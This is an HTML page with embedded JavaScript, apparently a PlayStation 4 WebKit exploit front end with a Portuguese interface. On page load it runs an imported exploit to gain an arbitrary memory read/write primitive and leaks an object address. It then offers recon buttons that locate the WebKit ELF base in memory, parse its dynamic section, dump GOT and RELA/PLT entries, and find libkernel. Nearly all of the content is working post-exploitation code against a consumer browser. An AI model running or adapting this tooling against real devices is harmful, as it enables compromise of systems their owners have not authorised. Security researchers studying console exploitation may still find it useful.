<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PS4 WebKit — Offset Finder</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg:        #0b0f19;
    --surface:   #111827;
    --border:    #1f2937;
    --text:      #c8ced8;
    --ok:        #4ade80;
    --err:       #f87171;
    --info:      #60a5fa;
    --warn:      #fbbf24;
    --accent:    #3b82f6;
    --accent-dk: #1d4ed8;
  }

  html, body {
    height: 100%;
    background: var(--bg);
    color: var(--text);
    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 0;
    overflow-x: hidden;
  }

  /* ── Header ── */
  header {
    width: 100%;
    background: linear-gradient(90deg, #0d1117, #161b27);
    border-bottom: 1px solid var(--border);
    padding: 14px 24px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 12px;
    flex-shrink: 0;
  }
  header h1 {
    font-size: 18px;
    font-weight: 700;
    color: #fff;
    letter-spacing: 0.4px;
  }
  .badge {
    font: 600 11px ui-monospace, monospace;
    padding: 3px 8px;
    border-radius: 6px;
    background: #1e293b;
    border: 1px solid #334155;
    color: var(--info);
  }

  /* ── Status bar ── */
  #status-bar {
    width: 100%;
    background: #0d1117;
    border-bottom: 1px solid var(--border);
    padding: 10px 24px;
    display: flex;
    align-items: center;
    gap: 10px;
    flex-shrink: 0;
  }
  #status-dot {
    width: 10px; height: 10px;
    border-radius: 50%;
    background: #374151;
    flex-shrink: 0;
    transition: background .3s;
  }
  #status-dot.running  { background: var(--warn); box-shadow: 0 0 6px var(--warn); }
  #status-dot.ok       { background: var(--ok);   box-shadow: 0 0 6px var(--ok);   }
  #status-dot.err      { background: var(--err);  box-shadow: 0 0 6px var(--err);  }
  #status-text {
    font-size: 14px;
    font-weight: 600;
    color: #e2e8f0;
  }

  /* ── Main area ── */
  main {
    flex: 1;
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 16px 20px;
    gap: 14px;
    overflow: hidden;
  }

  /* ── Log ── */
  #log {
    width: 100%; max-width: 980px;
    flex: 1;
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 14px 16px;
    overflow-y: auto;
    font: 12px/1.6 ui-monospace, "SFMono-Regular", "Consolas", monospace;
    color: #94a3b8;
    white-space: pre-wrap;
    word-break: break-all;
    box-shadow: inset 0 2px 8px rgba(0,0,0,.45);
  }
  #log .ok   { color: var(--ok);   }
  #log .err  { color: var(--err);  }
  #log .info { color: var(--info); }
  #log .warn { color: var(--warn); }
  #log .sep  { color: #334155; }

  /* ── Actions ── */
  #actions {
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
    justify-content: center;
    flex-shrink: 0;
    padding-bottom: 4px;
  }
  button {
    padding: 11px 26px;
    border: 1px solid rgba(255,255,255,.14);
    border-radius: 10px;
    color: #fff;
    font: 700 14px/1 "Segoe UI", system-ui, sans-serif;
    cursor: pointer;
    transition: transform .1s, opacity .1s;
    white-space: nowrap;
  }
  button:active  { transform: translateY(1px); }
  button:disabled {
    opacity: .38; cursor: not-allowed; transform: none;
  }

  #btnRecon  {
    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
    box-shadow: 0 6px 20px rgba(37,99,235,.35);
  }
  #btnRecon:not(:disabled):hover  { transform: translateY(-2px); }

  #btnGot {
    background: linear-gradient(135deg, #8b5cf6, #6d28d9);
    box-shadow: 0 6px 20px rgba(109,40,217,.3);
  }
  #btnGot:not(:disabled):hover { transform: translateY(-2px); }

  #btnRela {
    background: linear-gradient(135deg, #06b6d4, #0284c7);
    box-shadow: 0 6px 20px rgba(6,182,212,.28);
  }
  #btnRela:not(:disabled):hover { transform: translateY(-2px); }

  #btnClear {
    background: #1e293b;
    border-color: #334155;
    color: #94a3b8;
  }
  #btnClear:hover { background: #273448; }
</style>
</head>
<body>

<!-- ── Header ── -->
<header>
  <h1>PS4 WebKit — Offset Finder</h1>
  <span class="badge" id="fwBadge">FW: —</span>
</header>

<!-- ── Status bar ── -->
<div id="status-bar">
  <div id="status-dot" class="running"></div>
  <span id="status-text">Inicializando exploit...</span>
</div>

<!-- ── Main ── -->
<main>
  <div id="log"></div>
  <div id="actions">
    <button id="btnRecon"  disabled>Recon Completo</button>
    <button id="btnGot"    disabled>Dump GOT</button>
    <button id="btnRela"   disabled>Dump RELA</button>
    <button id="btnClear"  onclick="clearLog()">Limpar Log</button>
  </div>
</main>

<script type="module">
import { establishPrimitive } from "./resources/core.js";
import { installWindowP }     from "./resources/mem.js";
import { int64 }              from "./resources/int64.js";

/* ──────────────────────────────────────────────────
   UI helpers
────────────────────────────────────────────────── */
const logBox    = document.getElementById("log");
const statusDot = document.getElementById("status-dot");
const statusTxt = document.getElementById("status-text");
const fwBadge   = document.getElementById("fwBadge");

const btnRecon = document.getElementById("btnRecon");
const btnGot   = document.getElementById("btnGot");
const btnRela  = document.getElementById("btnRela");

function setStatus(text, state /* "running"|"ok"|"err" */) {
  statusTxt.textContent = text;
  statusDot.className = state || "";
}

function log(msg, cls = "info") {
  const line = document.createElement("div");
  line.className = cls;
  line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  logBox.appendChild(line);
  logBox.scrollTop = logBox.scrollHeight;
}

function sep(label) {
  const line = document.createElement("div");
  line.className = "sep";
  line.textContent = `── ${label} ${"─".repeat(Math.max(2, 56 - label.length))}`;
  logBox.appendChild(line);
  logBox.scrollTop = logBox.scrollHeight;
}

window.clearLog = () => { logBox.innerHTML = ""; };

/* ──────────────────────────────────────────────────
   int64 helpers
────────────────────────────────────────────────── */
function i64(lo, hi) { return new int64(lo >>> 0, (hi >>> 0)); }

function fromNum(n) {
  if (n instanceof int64) return n;
  const hi = Math.floor(n / 0x100000000);
  return new int64((n - hi * 0x100000000) >>> 0, hi >>> 0);
}

/* ──────────────────────────────────────────────────
   Safe ELF reader helpers
   (all reads are within confirmed mapped regions —
    no try/catch needed; a crash here would mean the
    ELF base scan overshot, which the size limits
    prevent.)
────────────────────────────────────────────────── */
const p = () => window.p;

function r1 (a)      { return p().read1(a); }
function r2 (a)      { return p().read2(a); }
function r4 (a)      { return p().read4(a); }
function r8 (a)      { return p().read8(a); }
function r8n(a)      { const v = r8(a); return v.hi * 0x100000000 + v.low; }

function readStr(base, maxLen) {
  let s = "";
  for (let i = 0; i < maxLen; i++) {
    const ch = r1(base.add32(i));
    if (ch === 0) break;
    s += String.fromCharCode(ch);
  }
  return s;
}

/* ──────────────────────────────────────────────────
   ELF base scanner
   Walks backwards from 'anchor' in PAGE steps within
   'maxMB', looking for the ELF magic 0x464c457f.
   Stays inside the module's .text (contiguous pages).
────────────────────────────────────────────────── */
const PAGE = 0x1000;

function findElfBase(anchor, maxMB) {
  const steps = (maxMB * 1024 * 1024) / PAGE;
  for (let i = 0; i < steps; i++) {
    const cand = anchor.sub32(i * PAGE);
    if (cand.hi === 0 && cand.low < 0x10000) break;
    if (r4(cand) === 0x464c457f) return cand;
  }
  return null;
}

/* ──────────────────────────────────────────────────
   ELF dynamic-section parser
   Returns the .dynamic entries as a plain object.
────────────────────────────────────────────────── */
function parseElfPhdr(base) {
  // e_phoff @ 0x20, e_phnum @ 0x38 (Elf64_Ehdr)
  const e_phoff = r8(base.add32(0x20)).low;   // assume fits in 32-bit offset
  const e_phnum = r2(base.add32(0x38));
  const PHDR    = 0x38;                        // sizeof(Elf64_Phdr)

  let res = { e_phoff, e_phnum, segments: [] };
  for (let i = 0; i < e_phnum; i++) {
    const ph    = base.add32(e_phoff + i * PHDR);
    const ptype = r4(ph);
    const pvaddr= r8(ph.add32(0x10));
    const poffs = r8(ph.add32(0x08));
    const pfile = r8(ph.add32(0x20));
    const pmem  = r8(ph.add32(0x28));
    res.segments.push({ ptype, pvaddr, poffs, pfile, pmem });
  }
  return res;
}

function parseElfDynamic(base) {
  const phdr = parseElfPhdr(base);
  const PT_DYNAMIC = 2;
  const dynSeg = phdr.segments.find(s => s.ptype === PT_DYNAMIC);
  if (!dynSeg) return null;

  // For position-independent DSOs, vaddr == file offset when base==load address
  const dynBase = base.add32(dynSeg.pvaddr.low);
  const DYNENT  = 0x10; // sizeof(Elf64_Dyn)

  let dt = {};
  for (let off = 0; ; off += DYNENT) {
    const ent   = dynBase.add32(off);
    const d_tag = r8(ent).low;
    const d_val = r8(ent.add32(8));
    if (d_tag === 0) break;      // DT_NULL

    // Record all tags we care about
    switch (d_tag) {
      case 1:  dt.dt_needed  = d_val; break;  // DT_NEEDED
      case 3:  dt.dt_pltgot  = d_val; break;  // DT_PLTGOT
      case 4:  dt.dt_hash    = d_val; break;  // DT_HASH
      case 5:  dt.dt_strtab  = d_val; break;  // DT_STRTAB
      case 6:  dt.dt_symtab  = d_val; break;  // DT_SYMTAB
      case 7:  dt.dt_rela    = d_val; break;  // DT_RELA
      case 8:  dt.dt_relasz  = d_val; break;  // DT_RELASZ
      case 10: dt.dt_strsz   = d_val; break;  // DT_STRSZ
      case 11: dt.dt_syment  = d_val; break;  // DT_SYMENT
      case 23: dt.dt_jmprel  = d_val; break;  // DT_JMPREL
      case 2:  dt.dt_pltrelsz= d_val; break;  // DT_PLTRELSZ
    }
  }
  return dt;
}

/* ──────────────────────────────────────────────────
   GOT dump
   Returns an array of { idx, off, addr (int64), inWk, external }
────────────────────────────────────────────────── */
function dumpGot(webkitBase, dt, count) {
  if (!dt || !dt.dt_pltgot) return [];
  const gotBase = webkitBase.add32(dt.dt_pltgot.low);
  const wkStart = webkitBase.hi * 0x100000000 + webkitBase.low;
  const wkEnd   = wkStart + 0x4000000;  // assume < 64 MB for WebKit

  const entries = [];
  for (let i = 0; i < count; i++) {
    const addr = r8(gotBase.add32(i * 8));
    const aNum = addr.hi * 0x100000000 + addr.low;
    const inWk = aNum >= wkStart && aNum < wkEnd;
    const valid = addr.hi > 0 && addr.hi <= 0xffff;
    entries.push({ idx: i, off: dt.dt_pltgot.low + i * 8, addr, inWk, external: valid && !inWk });
  }
  return entries;
}

/* ──────────────────────────────────────────────────
   RELA dump — reads relocations from DT_RELA / DT_JMPREL
   Returns array of { idx, r_offset, symIdx, relType, symName, gotVal }
────────────────────────────────────────────────── */
function dumpRela(webkitBase, dt, section /* "rela"|"jmprel" */, maxEntries) {
  const relaAddr = section === "jmprel" ? dt.dt_jmprel : dt.dt_rela;
  const relaSz   = section === "jmprel" ? dt.dt_pltrelsz : dt.dt_relasz;
  if (!relaAddr || !relaSz) return [];

  const relaBase  = webkitBase.add32(relaAddr.low);
  const RELA_ENTSZ = 0x18;  // sizeof(Elf64_Rela)
  const SYM_ENTSZ  = (dt.dt_syment ? dt.dt_syment.low : 0x18);

  const count = Math.min(relaSz.low / RELA_ENTSZ, maxEntries);
  const entries = [];

  for (let i = 0; i < count; i++) {
    const ent      = relaBase.add32(i * RELA_ENTSZ);
    const r_offset = r8(ent);
    const r_info   = r8(ent.add32(8));
    // ELF64: r_sym = r_info >> 32, r_type = r_info & 0xffffffff
    const symIdx   = r_info.hi;
    const relType  = r_info.low;

    let symName = "";
    if (symIdx > 0 && dt.dt_symtab && dt.dt_strtab) {
      const symEnt  = webkitBase.add32(dt.dt_symtab.low + symIdx * SYM_ENTSZ);
      const st_name = r4(symEnt);
      const namePtr = webkitBase.add32(dt.dt_strtab.low + st_name);
      symName = readStr(namePtr, 48);
    }

    let gotVal = null;
    try { gotVal = r8(webkitBase.add32(r_offset.low)); } catch (_) {}

    entries.push({ idx: i, r_offset, symIdx, relType, symName, gotVal });
  }
  return entries;
}

/* ──────────────────────────────────────────────────
   Libkernel locator
   Finds the ELF base of libkernel by scanning backwards
   from each external GOT entry (all within mapped pages).
────────────────────────────────────────────────── */
function findLibkernel(gotEntries) {
  const LK_SCAN_MB = 4;
  for (const { idx, addr } of gotEntries.filter(e => e.external)) {
    log(`  GOT[${idx}] externo → scan retroativo...`, "info");
    const base = findElfBase(addr, LK_SCAN_MB);
    if (!base) continue;
    // Confirm with a string search in the first 64 KB
    const CONFIRM_RANGE = 0x10000;
    let confirmed = false;
    for (let off = 0; off < CONFIRM_RANGE; off += 0x200) {
      const s = readStr(base.add32(off), 32);
      if (s.includes("libkernel") || s.includes("libScePthread")) {
        confirmed = true;
        break;
      }
    }
    if (confirmed) {
      log(`  libkernel confirmada @ 0x${base.toString(16)} (via GOT[${idx}])`, "ok");
      return base;
    }
    log(`  0x${base.toString(16)} é ELF mas não é libkernel`, "warn");
  }
  return null;
}

/* ──────────────────────────────────────────────────
   RECON COMPLETO
────────────────────────────────────────────────── */
async function reconPS4() {
  if (!window.p) { log("window.p não disponível!", "err"); return; }
  sep("RECON COMPLETO");

  // ── 0. UA ──────────────────────────────────────
  log(`User-Agent: ${navigator.userAgent}`, "info");

  // ── 1. nativeConstructorAddress ────────────────
  const ctorRaw = globalThis.__ps5NativeCtor;
  if (typeof ctorRaw !== "number" || ctorRaw <= 0x100000000) {
    log("__ps5NativeCtor inválido — exploit pode ter falhado", "err"); return;
  }
  const ctorAddr = fromNum(ctorRaw);
  log(`nativeCtorAddr = 0x${ctorAddr.toString(16)}`, "ok");

  // ── 2. WebKit base ─────────────────────────────
  log("Localizando WebKit ELF base (scan retroativo 48 MB)...", "info");
  const webkitBase = findElfBase(ctorAddr, 48);
  if (!webkitBase) { log("WebKit base NÃO encontrado!", "err"); return; }
  log(`WebKit base = 0x${webkitBase.toString(16)}`, "ok");
  window.__webkitBase = webkitBase;

  // ── 3. ELF dynamic ─────────────────────────────
  sep("ELF DYNAMIC");
  const dt = parseElfDynamic(webkitBase);
  if (!dt) { log("PT_DYNAMIC não encontrado no ELF!", "err"); return; }
  for (const [k, v] of Object.entries(dt)) {
    if (v) log(`  ${k.padEnd(15)} = +0x${v.toString(16)}`, "info");
  }

  // ── 4. GOT dump (64 entradas) ──────────────────
  sep("GOT DUMP");
  const gotEntries = dumpGot(webkitBase, dt, 64);
  const gotBase    = webkitBase.add32(dt.dt_pltgot.low);
  log(`GOT @ 0x${gotBase.toString(16)}`, "info");
  for (const { idx, addr, inWk, external } of gotEntries) {
    const tag = inWk ? " [WebKit]" : external ? " ← EXTERNO" : "";
    const cls = external ? "warn" : "info";
    log(`  GOT[${String(idx).padStart(3)}] = 0x${addr.toString(16)}${tag}`, cls);
  }

  // ── 5. Libkernel ───────────────────────────────
  sep("LIBKERNEL");
  const externals = gotEntries.filter(e => e.external);
  log(`${externals.length} entrada(s) externa(s) no GOT`, "info");
  const libkernelBase = findLibkernel(externals);
  if (!libkernelBase) log("libkernel não localizada via GOT", "warn");
  window.__libkernelBase = libkernelBase;

  // ── 6. RELA imports ────────────────────────────
  sep("RELA / PLT IMPORTS");
  const relaEntries = dumpRela(webkitBase, dt, "jmprel", 256);
  if (relaEntries.length === 0) {
    log("DT_JMPREL ausente — tentando DT_RELA...", "warn");
    const r2 = dumpRela(webkitBase, dt, "rela", 256);
    r2.forEach(({ idx, symName, r_offset, gotVal }) => {
      const gs = gotVal ? `0x${gotVal.toString(16)}` : "?";
      log(`  RELA[${String(idx).padStart(3)}] "${symName}" @+0x${r_offset.toString(16)} → ${gs}`, "info");
    });
  } else {
    relaEntries.forEach(({ idx, symName, r_offset, gotVal }) => {
      const gs = gotVal ? `0x${gotVal.toString(16)}` : "?";
      log(`  PLT[${String(idx).padStart(3)}] "${symName.padEnd(40)}" @+0x${r_offset.toString(16)} → ${gs}`, "info");
    });
  }

  // ── 7. Libkernel RELA (se encontrada) ──────────
  if (libkernelBase) {
    sep("LIBKERNEL — DYNAMIC");
    const lkDt = parseElfDynamic(libkernelBase);
    if (lkDt) {
      for (const [k, v] of Object.entries(lkDt)) {
        if (v) log(`  ${k.padEnd(15)} = +0x${v.toString(16)}`, "info");
      }
    }
  }

  // ── 8. Sumário ─────────────────────────────────
  sep("SUMÁRIO FINAL");
  log(`WebKit base:         0x${webkitBase.toString(16)}`, "ok");
  log(`WebKit GOT offset:  +0x${dt.dt_pltgot?.toString(16)}`, "ok");
  log(`Entradas externas no GOT: [${externals.map(e=>e.idx).join(", ")}]`, "ok");
  if (libkernelBase) log(`libkernel base:      0x${libkernelBase.toString(16)}`, "ok");
  log(`nativeCtor offset: +0x${(ctorRaw - (webkitBase.hi * 0x100000000 + webkitBase.low)).toString(16)}`, "ok");
}

/* ──────────────────────────────────────────────────
   GOT DUMP RÁPIDO (botão separado)
────────────────────────────────────────────────── */
async function quickGotDump() {
  if (!window.p) { log("window.p não disponível!", "err"); return; }
  if (!window.__webkitBase) { log("Executar Recon Completo primeiro!", "warn"); return; }
  sep("QUICK GOT DUMP");
  const webkitBase = window.__webkitBase;
  const dt = parseElfDynamic(webkitBase);
  if (!dt || !dt.dt_pltgot) { log("DT_PLTGOT não encontrado", "err"); return; }
  const entries = dumpGot(webkitBase, dt, 128);
  const gotBase = webkitBase.add32(dt.dt_pltgot.low);
  log(`GOT @ 0x${gotBase.toString(16)} — 128 entradas`, "info");
  for (const { idx, addr, inWk, external } of entries) {
    const tag = inWk ? " [WebKit]" : external ? " ← EXTERNO" : "";
    const cls = external ? "warn" : "info";
    log(`  [${String(idx).padStart(3)}] 0x${addr.toString(16)}${tag}`, cls);
  }
}

/* ──────────────────────────────────────────────────
   RELA DUMP COMPLETO (botão separado)
────────────────────────────────────────────────── */
async function quickRelaDump() {
  if (!window.p) { log("window.p não disponível!", "err"); return; }
  if (!window.__webkitBase) { log("Executar Recon Completo primeiro!", "warn"); return; }
  sep("RELA / JMPREL DUMP COMPLETO");
  const webkitBase = window.__webkitBase;
  const dt = parseElfDynamic(webkitBase);
  if (!dt) { log("dynamic section inválida", "err"); return; }

  const jmpRel = dumpRela(webkitBase, dt, "jmprel", 1024);
  if (jmpRel.length > 0) {
    log(`DT_JMPREL: ${jmpRel.length} entradas`, "ok");
    jmpRel.forEach(({ idx, symName, r_offset, gotVal }) => {
      const gs = gotVal ? `0x${gotVal.toString(16)}` : "?";
      log(`  PLT[${String(idx).padStart(4)}] "${symName.padEnd(44)}" @+0x${r_offset.toString(16)} → ${gs}`, "info");
    });
  }

  const rela = dumpRela(webkitBase, dt, "rela", 512);
  if (rela.length > 0) {
    log(`DT_RELA: ${rela.length} entradas`, "ok");
    rela.forEach(({ idx, symName, r_offset, relType, gotVal }) => {
      const gs = gotVal ? `0x${gotVal.toString(16)}` : "?";
      log(`  REL[${String(idx).padStart(4)}] type=${relType} "${symName.padEnd(40)}" @+0x${r_offset.toString(16)} → ${gs}`, "info");
    });
  }

  if (jmpRel.length === 0 && rela.length === 0)
    log("Nenhuma relocação encontrada — DT_JMPREL e DT_RELA ausentes", "warn");
}

/* ──────────────────────────────────────────────────
   BOOTSTRAP — roda o exploit e inicializa o primitivo
────────────────────────────────────────────────── */
btnRecon.onclick = reconPS4;
btnGot.onclick   = quickGotDump;
btnRela.onclick  = quickRelaDump;

// Detecta FW a partir do UA
(function detectFW() {
  const m = navigator.userAgent.match(/PlayStation 4\/(\S+)/);
  if (m) fwBadge.textContent = `PS4 FW ${m[1]}`;
  else   fwBadge.textContent  = "FW: desconhecida";
})();

log("Carregando módulos...", "ok");

establishPrimitive({ onEvent: (tag, detail) => log(`${tag}: ${detail}`, "info") })
  .then(carrier => {
    log("Core: primitivo estabelecido", "ok");
    log(`Tentativas: ${carrier.attempts}`, "info");

    const prim = installWindowP(carrier, {
      onEvent:  (tag, detail) => log(`${tag}: ${detail}`, "info"),
      promote: true
    });

    log("Mem: real pair ativo", "ok");
    log("window.p disponível", "ok");

    window.__carrier = carrier;
    window.__prim    = prim;
    window.int64     = int64;

    // Sanity leak
    try {
      const addr = prim.leakval(prim);
      log(`Sanity leakval(prim) = 0x${addr.toString(16)}`, "ok");
    } catch (e) {
      log(`Sanity leak falhou: ${e.message}`, "err");
    }

    setStatus("RW Primitivo OK — Pronto para Recon", "ok");
    btnRecon.disabled = false;
    btnGot.disabled   = false;
    btnRela.disabled  = false;
  })
  .catch(err => {
    log(`FALHA: ${err.name}: ${err.message}`, "err");
    setStatus(`Falha: ${err.message}`, "err");
  });
</script>
